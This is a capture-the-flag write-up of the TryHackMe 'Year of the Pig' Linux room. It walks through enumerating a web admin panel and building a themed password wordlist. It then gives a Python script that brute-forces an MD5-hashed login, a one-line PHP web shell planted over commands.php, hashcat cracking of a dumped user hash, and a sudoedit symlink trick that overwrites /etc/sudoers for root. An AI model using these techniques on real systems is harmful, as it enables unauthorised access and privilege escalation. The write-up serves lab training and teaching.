---
title: "Year Of The Pig TryHackMe Write Up"
last_modified_at: 2020-11-10T14:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - Linux
  - web
  - password bruteforcing with python
  - burp
  - api enumeration
  - sudoers entry
  - privilege escalation
  - sqlite
  - hashcat
  - Hard
---

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<img alt="yearofthepig" src="/assets/images/thm/yearofthepig/yearofthepig.jpeg" width="400px" height="150px">


[Yearofthepig](https://tryhackme.com/room/yearofthepig) is a hard rated linux room in TryHackMe by [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle). Information disclosure on the webserver results on leaking multiple api endpoints, usernames and password scheme which was all combined to bruteforce a password for user marco to get a shell on the box. On the box, hash for another user was found on a sqlite database which was cracked using hashcat and at last a entry on sudoers file was exploited to get a root shell on the box.

# Port Scan
### Full Port Scan
```console
local@local:~/Documents/tryhackme/yearofthepig$ nmap -p- --min-rate 10000 -v -oN nmap/allports 10.10.251.213
Nmap scan report for 10.10.251.213
Host is up (0.35s latency).
Not shown: 65452 closed ports, 81 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Detail Scan
```console
local@local:~/Documents/tryhackme/yearofthepig$ cat nmap/detail 
# Nmap 7.80 scan initiated Sat Nov  7 15:32:38 2020 as: nmap -p22,80 -A -oN nmap/detail -v 10.10.251.213
Nmap scan report for 10.10.251.213
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 9899F13BCC614EE8275B88FFDC0D04DB
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Marco's Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov  7 15:32:56 2020 -- 1 IP address (1 host up) scanned in 17.53 seconds
```
# HTTP service on Port 80
![1](/assets/images/thm/yearofthepig/1.png)
Website contains bunch of information about planes.

### Directory bruteforcing
```console
local@local:~/Documents/tryhackme/yearofthepig$ wfuzz -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -c -t 50 http://10.10.89.209/FUZZ                                                                                                 
********************************************************                                                                                                                        
* Wfuzz 3.0.3 - The Web Fuzzer                         *                                                                                                                        
********************************************************                                                                                                                        
                                                                                                                                                                                
Target: http://10.10.251.213/FUZZ                                                                                                                                               
Total requests: 30000                                                                                                                                                           
                                                                                                                                                                                
===================================================================                                                                                                             
ID           Response   Lines    Word     Chars       Payload                                                                                                         
===================================================================                                                                                                             
                                                                                                                                                                                
000000003:   301        9 L      28 W     314 Ch      "admin"                                                                                                         
000000009:   301        9 L      28 W     311 Ch      "js"                                                                                                            
000000084:   301        9 L      28 W     315 Ch      "assets"                                                                                                        
000000078:   301        9 L      28 W     312 Ch      "api"                                                                                                           
000000015:   301        9 L      28 W     312 Ch      "css"                                                                                                           
000004227:   403        9 L      28 W     278 Ch      "server-status"                                                                                                 
000004255:   200        72 L     462 W    4801 Ch     "http://10.10.251.213/"                                                                                         
                                                                                                                                                                                
Total time: 0                                                                                                                                                                   
Processed Requests: 29950                                                                                                                                                       
Filtered Requests: 29943                                                                                                                                                        
Requests/sec.: 0  
```
We got /admin and /api.

# Checking /admin
![2](/assets/images/thm/yearofthepig/2.png)
We are redirected to a login page.
If we analyze the response on Burp

### Request
`GET /admin/ HTTP/1.1`
We get a temporary redirection(302) with following response
### Partial Response
```html
<body>
		<table>
			<tr>
				<td class="nav" style="text-align: center">
					<button class="nav-btn" id="landing" onclick="changeContent('landing.php', this)">Welcome</button>
					<button class="nav-btn" id="commands" onclick="changeContent('commands.php', this)">Commands</button>
					<button class="nav-btn" id="adduser" onclick="changeContent('adduser.php', this)">Add User</button>
					<button class="nav-btn" id="deleteuser" onclick="changeContent('deleteuser.php', this)">Delete User</button>
					<button class="nav-btn" id="resetpassword" onclick="changeContent('resetpassword.php', this)">Reset Password</button>
					<button class="nav-btn" id="logout" onclick="logout()">Logout</button>
				</td>
				<td>
					<iframe id="content" src="landing.php" style="opacity: 0">
				</td>
			</tr>
		</table>
	</body>
```
We can see that we get bunch of php files. So, lets check each of them on BurpSuite.

## Visiting /admin/landing.php
```html
<body class="include">
		<h1 id="content-title">Admin Page</h1>
		<h2>Welcome, </h2>
	</body>
</html>
```

## Visiting /admin/commands.php
```html
<body class="include">
		<h1 id="content-title">Commands</h1>
		<h2>Use this page to execute arbitrary commands on the system</h2>
		<form method=post style="display: inline;">
			<input type=text name="command" class="input" placeholder="Command...">
			<input style="display:none;" type=submit name="submit" value="Execute" class="input" id="submit">
		</form>
		<img alt="submit" src="/assets/img/arrow.png" class="submit-btn" onclick="javascript:document.querySelector('#submit').click()">
			</body>
```
Looks like a form with which we can execute commands. Lets check if we can execute commamds without being authenticated.

## Trying to execute commands
### Request
```console
POST /admin/commands.php HTTP/1.1
Host: 10.10.89.209
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ne;q=0.8
Connection: close
Content-Length: 25

command=id&Execute=submit
```
But we dont have any luck. Looks like we have to be authorized to do that.

## Cheking /admin/adduser.php
### Response
```html
<body class="include">
		<h1 id="content-title">Add User</h1>
		<h2>Add new users</h2>
		<input type=text class="input" id="username-input" placeholder="Username">
		<input type=password class="input" id="password-input" placeholder="Password">
		<img alt="submit" src="/assets/img/arrow.png" class="submit-btn" id="new-user-submit" onclick="send()">
	</body>
	<script>
const _0x4659=['keyup','keyCode','json','#new-user-submit','querySelector','querySelectorAll','click','same-origin','stringify','then','post','addEventListener','#password-input','input','value','#username-input','Verbose','application/json','/api/adduser'];(function(_0x510a00,_0x4659cb){const _0x4d062d=function(_0x197e8d){while(--_0x197e8d){_0x510a00['push'](_0x510a00['shift']());}};_0x4d062d(++_0x4659cb);}(_0x4659,0x79));const _0x4d06=function(_0x510a00,_0x4659cb){_0x510a00=_0x510a00-0x0;let _0x4d062d=_0x4659[_0x510a00];return _0x4d062d;};function send(){const _0x32f63c=document[_0x4d06('0x10')]('#username-input')[_0x4d06('0x7')],_0x3ce352=document[_0x4d06('0x10')](_0x4d06('0x5'))['value'];fetch(_0x4d06('0xb'),{'method':_0x4d06('0x3'),'credentials':_0x4d06('0x0'),'headers':{'Accept':_0x4d06('0xa')},'body':JSON[_0x4d06('0x1')]({'username':_0x32f63c,'password':_0x3ce352})})[_0x4d06('0x2')](_0x46fca2=>_0x46fca2[_0x4d06('0xe')]())[_0x4d06('0x2')](_0x226295=>{document[_0x4d06('0x10')](_0x4d06('0x8'))[_0x4d06('0x7')]='',document[_0x4d06('0x10')]('#password-input')[_0x4d06('0x7')]='',alert(_0x226295[_0x4d06('0x9')]);});}document[_0x4d06('0x11')](_0x4d06('0x6'))['forEach'](_0x4c5f31=>{_0x4c5f31[_0x4d06('0x4')](_0x4d06('0xc'),_0x15a890=>{_0x15a890[_0x4d06('0xd')]===0xd&&document[_0x4d06('0x10')](_0x4d06('0xf'))[_0x4d06('0x12')]();});});
	</script>
```
There were a lot of obfuscated javascript, but it does leak a api endpoint ie /api/adduser. I was not not sure what this js was doing, so I copied the file on my box, served it with a python HTTP server and made a post request.
### HTTP server
```console
local@local:~/Documents/tryhackme/yearofthepig/http$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

## Checking the debugger on chrome
```html
Request URL: http://localhost:8000/api/adduser
Payload: {username: "test", password: "test"}
          password: "test"
          username: "test"
```
Now we know what the request is made exactly, let us make a request to the api endpoint.

## Trying to add a new user.
### Request
```html
POST /api/adduser HTTP/1.1
Host: 10.10.89.209
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ne;q=0.8
Connection: close
Content-Length: 29

username=admin&password=admin
```
### Response
```html
{"Response":"Error","Verbose":"Cannot add users without being authenticated"}
```
## Checking /admin/resetpassword.php
### Response
```html
<body class="include">
		<h1 id="content-title">Reset Passwords</h1>
		<h2>Reset User Passwords</h2>
		<select class="input" id=userlist>
	<option id=curtis value=curtis>curtis</option>
	<option id=marco value=marco>marco</option>
</select>
		<input class="input" type=password id="reset-password-input">
		<img alt="submit" src="/assets/img/arrow.png" class="submit-btn" id="reset-password-btn" onclick="send()">
	</body>
```
Here we get two valid usernames on the website, **marco** and **curtis**.

I also tried if I can reset the passwords of these users and also all other php  scripts and all the api endpoints, but I did not get anything. So, now that I have two valid users, I decided to look into the login page.

## Cheking /login.php
I tried to login with common passwords at first like `marco:marco`.
![3](/assets/images/thm/yearofthepig/3.png)
Well we get the information about the potential password format. At first I thought it might be a rabbit hole to keep attackers trying something wrong to keep them busy. But after a while I had nothing to look at and I thought I should give it a try.
Now at first we have to find a memorable word of that user. The guy has made a website about planes, so we know what he likes.
And if we check the content of the homepage, he has written a lot about the planes too.

### Partial  Content of the homepage
![4](/assets/images/thm/yearofthepig/4.png)
```
Flying has been my entire life. I know everything there is to know about planes -- especially sea planes like the Savoia S.21: my personal favourite. Towards the end of the war we were flying in the Italian-made Macchi M.5 Fighters -- they were nice and all, but too slow for my liking! Agility was top-notch though, so there's a plus. Another plane I've learnt to love is the Curtiss R3C-0, behind the Savoia it's the king of the skies! Took a long time to convince him to let me fly it, but well worth the wait.
```
Here the author talks about Savio S.21 being his favourite. And it also looks like in the format that the password is supposed to be.
So I started making wordlist around this word.
### Potential format
```Savios21<symbol>
savios21<symbol>
Savio21<symbol>
savio21<symbol>
```
### Content of password.txt
```
savoia21@
savoia21#
savoia21$
savoia21%
savoia21^
savoia21&
savoia21*
savoia21(
savoia21)
savoia21_
savoia21-
savoia21=
savoia21+
savoia21[
savoia21{
savoia21]
savoia21!
.........
.........
SavoiaS21]
SavoiaS21}
SavoiaS21;
SavoiaS21:
SavoiaS21'
SavoiaS21"
SavoiaS21<
SavoiaS21,
SavoiaS21.
SavoiaS21>
SavoiaS21/
SavoiaS21?
SavoiaS21`
SavoiaS21~
SavoiaS21\
SavoiaS21|
```
## Analysing the Request
```html
POST /api/login HTTP/1.1
Host: 10.10.89.209
Content-Length: 66
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Origin: http://10.10.89.209
Referer: http://10.10.89.209/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ne;q=0.8
Connection: close

{"username":"marco","password":"f5888d0bb58d611107e11f7cbc41c97a"}
```
It makes the md5sum of the password first. So lets a python script to automate this process.

### Content of brute.py
```py
#!/usr/bin/python
import requests
import hashlib

user = 'marco'
url = 'http://10.10.89.209/api/login'
headers = {'Accept': 'application/json'}
f = open('password','r')
for line in f.readlines():
        line = line.strip()
        result = hashlib.md5(line.encode()).digest().hex()
        print("Trying : " + result,end='\r',flush=True)
        data = { 'username':user,
                 'password':result}

        r = requests.post(url=url,json=data,headers=headers,proxies={'http':'127.0.0.1:8080'})
        if 'Incorrect Username or Password' not in r.text:
                print("\nPassword Found for "+user + ':'  + line)
                exit(0)

print('Finished')
```
And while you are writing the code use:
```bash
local@local:~/Documents/tryhackme/yearofthepig/http$ while true;do inotifywait -q -e modify brute.py; clear; python brute.py ;done
```
This will listen for the file modify event and it runs when you save the file and  it will execute the script brute.py which will save you a lot of time going back and forth while writing the code.

## Ouput
```console
local@local:~/Documents/tryhackme/yearofthepig/http$ python brute.py 
Trying : ea**********************211
Password Found for marco:<redacted>
```
We got a valid password. Lets log in now.

## Loggin in 
![5](/assets/images/thm/yearofthepig/5.png)
We obviously want to execute commands on the host. So lets check that out.

## commands.php
![6](/assets/images/thm/yearofthepig/6.png)
Nice, we are running as www-data.

### Trying to get a reverse shell
I tried to get a reverse shell, but I had no luck. Almost none of the command worked except **nc**. With nc also, we get a connection back but not the shell. So, I gave up and tried to login with the username:password using SSH.

## Shell as marco
```console
local@local:~/Documents/tryhackme/yearofthepig/http$ ssh marco@10.10.89.209
The authenticity of host '10.10.89.209 (10.10.89.209)' can't be established.
ECDSA key fingerprint is SHA256:2KjF+8WJY6OrFINzn62WeweHnY6FXTMQ9Xfa6RTvPhA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.89.209' (ECDSA) to the list of known hosts.
marco@10.10.89.209's password: 


        __   __                       __   _   _            ____  _       
        \ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \(_) __ _ 
         \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_) | |/ _` |
          | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  __/| | (_| |
          |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|   |_|\__, |
                                                                    |___/ 


marco@year-of-the-pig:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers)
marco@year-of-the-pig:~$ 
```
And we login as marco.

# Reading the first flag
```console
marco@year-of-the-pig:~$ ls
flag1.txt
marco@year-of-the-pig:~$ cat flag1.txt 
THM{MDg0MGVj******************jhl}
```

# Horizontal Privilege Escalation to user curtis

### Listing user on the box with shell
```console
marco@year-of-the-pig:~$ cat /etc/passwd | grep -i bash
root:x:0:0:root:/root:/bin/bash
marco:x:1000:1000::/home/marco:/bin/bash
curtis:x:1001:1001::/home/curtis:/bin/bash
```
User curtis is a user on the box. Then I thought as the SSH password for marco is same as the login password on the website, what if the user password for user curtis on the box is same as his login password on the webserver.

## Enumerating the files of the webserver
```console
marco@year-of-the-pig:/var/www$ ls -la
total 36
drwxr-xr-x  3 www-data web-developers  4096 Nov 10 03:43 .
drwxr-xr-x 13 root     root            4096 Aug 22 00:02 ..
-rw-------  1 www-data www-data       24576 Nov 10 03:43 admin.db
drwxrwxr-x  7 www-data web-developers  4096 Aug 21 23:57 html
```
There was a admin.db file which should contain the password for user curtis but it can only be read by user **www-data**. 
As the commands.php was acting weird, I looked at the content of that file.

## Files on  /admin/
```console
marco@year-of-the-pig:/var/www/html/admin$ ls -la
total 56
drwxrwxr-x 2 www-data web-developers 4096 Aug 21 23:28 .
drwxrwxr-x 7 www-data web-developers 4096 Aug 21 23:57 ..
-rwxrwxr-x 1 www-data web-developers 1988 Aug 21 23:17 adduser.php
-rwxrwxr-x 1 www-data web-developers 1718 Aug 21 23:08 commands.php
-rwxrwxr-x 1 www-data web-developers 1766 Aug 21 23:18 deleteuser.php
-rwxrwxr-x 1 root     root            338 Aug 21 12:52 getCurrentUser.php
-rwxrwxr-x 1 www-data web-developers  270 Aug 21 22:28 getUsers.php
-rwxrwxr-x 1 www-data web-developers  393 Aug 21 22:29 includes.php
-rwxrwxr-x 1 www-data web-developers 3286 Aug 21 23:26 index.php
-rwxrwxr-x 1 www-data web-developers  390 Aug 21 12:52 landing.php
-rwxrwxr-x 1 root     root            143 Aug 21 12:08 prepareAuth.php
-rwxrwxr-x 1 www-data web-developers 1803 Aug 21 23:26 resetpassword.php
-rwxrwxr-x 1 root     root            268 Aug 21 12:17 sessionCleanup.php
-rwxrwxr-x 1 www-data web-developers  782 Aug 21 23:28 style.css
```
## Partial Content of commands.php
```php
<?php
        //Totally useless script to catch hackers out, eh, Marco? You old rogue!
        if (isset($_POST["command"])){
                echo "<pre>";
                $cmd=$_POST["command"];
                if (strlen($cmd) == 0){
                        echo "No command entered";
                }
                else if ($cmd == "whoami"){
                        echo "www-data";
                }
                else if ($cmd == "id"){
                        echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
                }
                else if ($cmd == "ifconfig"){
                        system("ifconfig");
                }
                else if (substr($cmd,0,5) == "echo "){
                        echo substr($cmd,5);
                }
                else if ($cmd == "hostname"){
                        echo "year-of-the-pig";
                }
                else if (stristr($cmd,"nc")){
                        preg_match("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3} +\d{1,5}/", $cmd, $string);
                        $components = explode(" ", $string[0]);
                        $ip = $components[0];
                        $port = end(array_values($components));
                        system("nc $ip $port >/dev/null 2>&1");
                }
                else{
                        echo "Invalid Command!";
                }
                echo "<pre>\n";
        }
?>
```
The output of the commands whoami,id are hardcoded and there is some filter for command involving **nc**. So now I was thinking if I could bypass this, the webserver must be running as www-data and that way I could get code execution as user www-data.

## Checking apache process
```console
marco@year-of-the-pig:/var/www/html/admin$ ps -aux | grep -i apache
root       600  0.0  2.9 336556 14408 ?        Ss   02:48   0:00 /usr/sbin/apache2 -k start
www-data   611  0.0  3.0 341512 15128 ?        S    02:48   0:02 /usr/sbin/apache2 -k start
www-data   616  0.0  3.0 341460 14956 ?        S    02:48   0:00 /usr/sbin/apache2 -k start
www-data   617  0.0  2.8 341460 13944 ?        S    02:48   0:00 /usr/sbin/apache2 -k start
www-data   618  0.0  3.1 341516 15264 ?        S    02:48   0:00 /usr/sbin/apache2 -k start
www-data   629  0.0  3.0 341484 15208 ?        S    02:48   0:00 /usr/sbin/apache2 -k start
www-data   854  0.0  3.0 341516 14920 ?        S    02:52   0:00 /usr/sbin/apache2 -k start
www-data   857  0.0  3.0 341464 14800 ?        S    02:52   0:00 /usr/sbin/apache2 -k start
www-data   858  0.0  3.2 341460 15848 ?        S    02:52   0:00 /usr/sbin/apache2 -k start
www-data   859  0.0  3.2 341464 15760 ?        S    02:52   0:00 /usr/sbin/apache2 -k start
www-data   860  0.0  3.2 341468 16092 ?        S    02:52   0:00 /usr/sbin/apache2 -k start
marco     1106  0.0  0.2  14428   996 pts/0    S+   03:58   0:00 grep --color=auto -i apache
```
And it was running as www-data.

But it turned out we can easily edit the file as our user marco is in the web-developers group.
```console
marco@year-of-the-pig:/var/www/html/admin$ ls -la commands.php 
-rwxrwxr-x 1 www-data web-developers 1718 Aug 21 23:08 commands.php
marco@year-of-the-pig:/var/www/html/admin$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers)
```
So, lets make a copy of the file and edit the file to execute any commands we like as www-data.

## New content of commands.php 
```console
marco@year-of-the-pig:/var/www/html/admin$ cp commands.php commands.php.bak
marco@year-of-the-pig:/var/www/html/admin$ vi commands.php
marco@year-of-the-pig:/var/www/html/admin$ cat commands.php
<?php
echo system($_REQUEST['cmd']);
?>
```
## Code execution as www-data
```console
marco@year-of-the-pig:/var/www/html/admin$ curl localhost/admin/commands.php -d 'cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(web-developers)
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(web-developers)
```
And this time we get code execution as www-data.
### Changing file permission for admin.db
```console
marco@year-of-the-pig:/var/www/html/admin$ curl localhost/admin/commands.php -d 'cmd=chmod 777 /var/www/admin.db'
marco@year-of-the-pig:/var/www/html/admin$ ls -la /var/www/admin.db 
-rwxrwxrwx 1 www-data www-data 24576 Nov 10 03:43 /var/www/admin.db
```
And we can see that the file permission is changed.

## Content of admin.db
```console
marco@year-of-the-pig:/var/www/html/admin$ cd /var/www
marco@year-of-the-pig:/var/www$ ls
admin.db  html
marco@year-of-the-pig:/var/www$ sqlite3 admin.db 
SQLite version 3.22.0 2018-01-22 18:45:57
Enter ".help" for usage hints.
sqlite> .schema
CREATE TABLE users (
userID TEXT UNIQUE PRIMARY KEY,
username TEXT UNIQUE,
password TEXT);
CREATE TABLE sessions (
sessID TEXT UNIQUE PRIMARY KEY,
userID TEXT,
expiryTime TEXT);
sqlite> select * from users;
58a2f366b1fd51e127a47da03afc9995|marco|ea22********************1ac
f64ccfff6f64d57b121a85f9385cf256|curtis|a80b********************f2
```
We get a hash for user curtis and it is in md5.
### Cracking the hash using hashcat
```console
local@local:~/Documents/tryhackme/yearofthepig$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt                                                                 [42/43]
hashcat (v5.1.0) starting...

a80b********************1f2:<redacted>     
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
```
And the hash cracks instantly.

## Shell as curtis
```console
marco@year-of-the-pig:/var/www$ su curtis 
Password: 
curtis@year-of-the-pig:/var/www$ 
```
## Reading user flag
```console
curtis@year-of-the-pig:/var/www$ cd ~
curtis@year-of-the-pig:~$ ls -la
total 28
drwxr-xr-x 3 curtis curtis 4096 Nov 10 04:06 .
drwxr-xr-x 4 root   root   4096 Aug 16 14:12 ..
lrwxrwxrwx 1 root   root      9 Aug 16 14:12 .bash_history -> /dev/null
-rw-r--r-- 1 curtis curtis  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 curtis curtis 3771 Apr  4  2018 .bashrc
-r-------- 1 curtis curtis   38 Aug 22 00:51 flag2.txt
drwx------ 3 curtis curtis 4096 Nov 10 04:06 .gnupg
-rw-r--r-- 1 curtis curtis  807 Apr  4  2018 .profile
curtis@year-of-the-pig:~$ cat flag2.txt 
THM{Y2Q2N*****************zMmZh}
```
# Privilege Escaltion to root
### Sudo -l
```console
curtis@year-of-the-pig:~$ sudo -l
[sudo] password for curtis: 
Matching Defaults entries for curtis on year-of-the-pig:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH"

User curtis may run the following commands on year-of-the-pig:
    (ALL : ALL) sudoedit /var/www/html/*/*/config.php
```
Looking at the entry we can edit a specific type of file as root and also we have some degree of freedom to chose the filepath.

### Creating a directory first using user marco
```console
curtis@year-of-the-pig:~$ exit
exit
marco@year-of-the-pig:/var/www$ cd /var/www/html
marco@year-of-the-pig:/var/www/html$ mkdir test
marco@year-of-the-pig:/var/www/html$ chmod 777 test/
```
As marco can write on that directory, I have created a dir called test and made it world writeable.

### Creating another sub directory with user curtis
```console
curtis@year-of-the-pig:/var/www/html/test$ mkdir sub-dir
curtis@year-of-the-pig:/var/www/html/test$ cd sub-dir/
```
And inside test I have also made a subdirectory. Now to exploit this file editing privilege, I would create a file called config.php which will be a symbolic link to any of the important files like /etc/shadow or /root/.ssh/authorized_keys or /etc/sudoers. As we have a root privilege to edit those files, we can edit those files and can be root.

## Editing /etc/sudoers file
I have first try to edit authorized_keys of root, but it doesnot seem to exist and with /etc/shadow file, we have to change the password of the root user and the root user might not be able to login next time, so it is safer to edit /etc/sudoers file.
```bash
urtis@year-of-the-pig:/var/www/html/test$ cd sub-dir/
curtis@year-of-the-pig:/var/www/html/test/sub-dir$ ls
curtis@year-of-the-pig:/var/www/html/test/sub-dir$ ln -sf /etc/sudoers config.php
curtis@year-of-the-pig:/var/www/html/test/sub-dir$ ls -la
total 8
drwxrwxr-x 2 curtis curtis 4096 Nov 10 04:16 .
drwxrwxrwx 3 marco  marco  4096 Nov 10 04:12 ..
lrwxrwxrwx 1 curtis curtis   12 Nov 10 04:16 config.php -> /etc/sudoers
curtis@year-of-the-pig:/var/www/html/test/sub-dir$ sudoedit /var/www/html/test/sub-dir/config.php 
curtis@year-of-the-pig:/var/www/html/test/sub-dir$ sudoedit /var/www/html/test/sub-dir/config.php 

sudoedit: /var/www/html/test/sub-dir/config.php unchanged
```
And the file is successfully changed.
## Updated content of /etc/sudoers
```
## User privilege specification
##
root ALL=(ALL) ALL
curtis ALL=(ALL) ALL
```
I have given user curtis same privileges as user root.

## Getting a root shell
```console
curtis@year-of-the-pig:/var/www/html/test/sub-dir$ sudo su
root@year-of-the-pig:/var/www/html/test/sub-dir# id
uid=0(root) gid=0(root) groups=0(root)
```

## Reading root flag
```console
root@year-of-the-pig:/var/www/html/test/sub-dir# cd /root
root@year-of-the-pig:~# ls -la
total 36
drwx------  5 root root 4096 Aug 22 12:29 .
drwxr-xr-x 22 root root 4096 Aug 16 14:07 ..
lrwxrwxrwx  1 root root    9 Aug 16 13:56 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Aug 16 13:56 .cache
drwx------  3 root root 4096 Aug 16 13:56 .gnupg
drwxr-xr-x  3 root root 4096 Aug 21 20:11 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   38 Aug 22 00:53 root.txt
-rw-r--r--  1 root root   42 Aug 16 16:50 .vimrc
root@year-of-the-pig:~# cat root.txt 
THM{MjcxNm****************NDA0}
```